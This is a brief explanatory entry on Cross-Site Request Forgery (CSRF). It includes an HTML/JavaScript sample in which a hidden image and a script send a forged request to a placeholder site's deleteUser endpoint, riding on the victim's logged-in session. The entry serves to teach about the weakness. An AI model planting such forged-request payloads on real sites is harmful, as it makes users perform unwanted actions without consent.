Cross-Site Request Forgery (CSRF) - This weakness involves the exploitation of a web application's trust in a user's browser, allowing attackers to perform unwanted actions on behalf of the user.
## Example (HTML/JavaScript)
```html
<img src="http://example.com/deleteUser?id=123" style="display: none" onload="attack()">
<script>
    function attack() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://example.com/deleteUser?id=123", true);
        xhr.send();
        // Vulnerability: If the user is logged in to 'example.com', the hidden image would trigger a DELETE action on their behalf without their consent.
    }
</script>
```
